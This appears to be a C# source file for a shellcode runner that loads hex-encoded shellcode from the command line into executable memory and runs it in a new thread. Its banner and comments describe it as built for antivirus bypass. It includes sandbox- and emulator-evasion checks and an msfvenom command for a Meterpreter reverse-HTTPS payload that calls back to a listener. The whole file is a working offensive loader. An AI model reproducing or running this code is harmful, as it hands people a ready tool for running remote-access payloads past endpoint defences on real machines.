using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace HexRunner
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStacksize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        static void Main(string[] args)
        {

            Console.WriteLine("--- C# ShellCode Runner. Converts HEX payload to byte array for improved AV bypass. ---");
            Thread.Sleep(1000);
            //AV Evasion, if simulator detected, do nothing

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;



            if (t2 < 1.5)
            {
                return;
            }

            if (args.Length == 0)
            {
                Console.WriteLine("Please provide a hexadecimal string as a command line argument.");
                Console.WriteLine("\nExample: AvRunner.exe 68656C6C6F20776F726C64");
                return;
            }

            //Takes shellcode from user input
            //Create shellcode in hex format, ex: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.218 LPORT=443 -f hex

            string hexString = args[0];
            byte[] hexbuf = Hex2Byte(hexString);
            //Console.WriteLine(BitConverter.ToString(buf));

            byte[] convertedArray = new byte[hexbuf.Length];
            for (int i = 0; i < hexbuf.Length; i++)
            {
                convertedArray[i] = Convert.ToByte(hexString.Substring(i * 2, 2), 16);
            }

            int size = hexbuf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);

            //AV Evasion, if emulated do nothing
            if (mem == null)
            {
                return;
            }

            Console.WriteLine("Executing payload, check your listener.");
            Marshal.Copy(hexbuf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);



            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
        static byte[] Hex2Byte(string hexString)
        {
            if (hexString.Length % 2 != 0)
                throw new ArgumentException("Hex string must have an even length.");

            byte[] byteArray = new byte[hexString.Length / 2];
            for (int i = 0; i < byteArray.Length; i++)
            {
                byteArray[i] = Convert.ToByte(hexString.Substring(i * 2, 2), 16);
            }

            return byteArray;
        }
    }
}
